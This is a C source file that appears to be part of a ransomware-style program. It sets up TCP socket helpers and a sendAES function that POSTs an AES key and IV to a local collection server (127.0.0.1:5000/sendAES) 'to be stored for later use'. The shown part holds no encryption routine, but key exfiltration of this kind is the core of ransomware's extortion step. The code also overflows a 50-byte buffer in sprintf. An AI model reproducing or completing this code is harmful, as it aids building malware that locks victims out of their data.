/* Copyright (C) 2023 Sean Kannanaika; - All Rights Reserved
 * You may use, distribute and modify this code under the fact
 * that code and knowledge should not be owned by anyone.  Have
 * at it viewers of my code. Do whatever the hell you want.
 */

//necessary includes
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <openssl/bio.h>
#include <openssl/pem.h>
#include <openssl/rsa.h>
#include <openssl/crypto.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <curl/curl.h>

//number of retries
#define RETRIES 10

/*
Function that will create and return a socket handler
*/
int createSocket(void){
    int socket_connection;
    socket_connection = socket(AF_INET, SOCK_STREAM, 0);
    if(socket_connection == -1){
        return -1;
    }

    return socket_connection;

}

/*
@param ip, socket_connection handle, port
Will connect to a server on a given port using the parametrized
socket handler
*/
int connectToServer(char * ip_addr, int socket_connection, int port){
    struct sockaddr_in server;
    server.sin_addr.s_addr = inet_addr(ip_addr);
    server.sin_family = AF_INET;
    server.sin_port = htons (port);

    if(connect(socket_connection, (struct sockaddr *) &server, sizeof(server)) < 0){
        return -1;
    }

    return 0;
}

/*
@param data to send, and socket handler
This function will send the parametrized data to the server
via the socket handle that was passed
*/
int sendData(char * data, int socket_connection){
    if(send(socket_connection, data, strlen(data), 0) < 0){
        return -1;
    }

    return 0;
}

int recvData(int socket_connection, char buffer[]){
    if(recv(socket_connection, buffer, 4096, 0) < 0){
        return -1;
    }
    
    return 0;
}

/*
@param key and iv
This function will communicate with the server via a post request and send over the
key and iv to be stored for laster use
*/
void sendAES(char *key, char *iv){
    char sendingData[50];
    CURL *curl;
    CURLcode result;
    struct curl_slist *headers = NULL;

    
    sprintf(sendingData, "{\"key\": \"%s\", \"iv\": \"%s\"}", key, iv);
    headers = curl_slist_append(headers, "Content-Type: application/json");

    curl = curl_easy_init();
    if(curl){
        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5000/sendAES");
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, sendingData);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(sendingData));
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        result = curl_easy_perform(curl);
        if(result != CURLE_OK){
            exit(1);
        }

        curl_easy_cleanup(curl);
    }    
}
